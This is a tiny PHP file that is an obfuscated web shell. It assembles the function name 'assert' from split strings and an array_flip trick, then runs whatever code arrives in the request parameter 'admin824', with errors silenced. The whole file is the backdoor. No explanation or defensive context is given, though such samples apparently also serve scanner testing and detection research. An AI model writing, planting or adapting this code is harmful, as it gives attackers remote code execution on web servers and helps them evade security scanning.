----------
<?php
$a1 = "ass";
$a2 = "ert";
$arr=array($a1.$a2=>"test");
$arr1=array_flip($arr);
$arr2 = "$arr1[test]";
@$arr2($_REQUEST['admin824']);
?>
